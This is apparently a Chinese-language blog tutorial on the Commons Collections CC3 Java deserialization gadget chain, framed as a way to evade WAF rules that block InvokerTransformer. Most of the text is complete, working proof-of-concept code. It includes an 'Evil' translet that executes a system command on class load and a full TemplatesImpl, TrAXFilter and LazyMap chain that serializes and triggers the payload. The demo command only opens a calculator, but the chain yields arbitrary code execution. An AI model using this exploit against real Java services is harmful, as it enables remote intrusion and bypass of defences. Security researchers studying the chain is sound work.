# 0x01 Preface

前面CC1和CC6的sink都在`InvokerTransformer`上，若WAF直接禁用了该类，是否就无法突破了呢？Introducing~ `com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter`

```java
public TrAXFilter(Templates templates)  throws
    TransformerConfigurationException
{
    _templates = templates;
    _transformer = (TransformerImpl) templates.newTransformer();
    _transformerHandler = new TransformerHandlerImpl(_transformer);
    _useServicesMechanism = _transformer.useServicesMechnism();
}
```

该类构造方法中调用了`(TransformerImpl) templates.newTransformer()`

`TransformerImpl`在加载字节码那提过，`newTransformer`最后能调用到`defineClass()`加载恶意字节码。

但是目前看来如果没有`InvokerTransfomer`，`TrAXFilter`的构造方法也无法调用

这里要用到新的`Transformer`实现类`InstantiateTransformer`，看看它的`transform`，它的作用就是调用构造函数，返回类实例。

```java
public Object transform(Object input) {
    //....
    Constructor con = ((Class) input).getConstructor(iParamTypes);
    return con.newInstance(iArgs);
    //....
}
```

# 0x02 Weave POC

使用javassist来获取字节码

```xml
<dependency>
    <groupId>org.javassist</groupId>
    <artifactId>javassist</artifactId>
    <version>3.29.2-GA</version>
</dependency>
```

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Evil extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers)
            throws TransletException {}
    public void transform(DOM document, DTMAxisIterator iterator,
                          SerializationHandler handler) throws TransletException {}
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
```

```java
public static void setFieldValue(Object obj, String fieldName, Object newValue) throws Exception {
    Class clazz = obj.getClass();
    Field field = clazz.getDeclaredField(fieldName);
    field.setAccessible(true);
    field.set(obj, newValue);
}

public static void main(String[] args) throws Exception {
    byte[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();
    TemplatesImpl obj = new TemplatesImpl();
    setFieldValue(obj, "_bytecodes", new byte[][] {code});
    setFieldValue(obj, "_name", "HelloCC3");
    setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
    Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(
            new Class[] { Templates.class },
            new Object[] { obj })
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    Map argMap = new HashMap();
    Map evilMap = TransformedMap.decorate(argMap, null, chainedTransformer);
    evilMap.put("xxx", "yyy");
}
```

将CC6改造成CC3模样：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC3 {
    public static void setFieldValue(Object obj, String fieldName, Object newValue) throws Exception {
        Class clazz = obj.getClass();
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, newValue);
    }

    public static void main(String[] args) throws Exception {
        byte[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloCC3");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { obj })
        };
        
        Transformer[] fakeTransformers = new Transformer[] {new
                ConstantTransformer(1)};
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map map = new HashMap();
        Map lazyMap = LazyMap.decorate(map, transformerChain);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test");
        Map expMap = new HashMap();
        expMap.put(tiedMapEntry, "xxx");

        lazyMap.remove("test");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(expMap);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
        Object o = (Object) ois.readObject();
    }

}
```

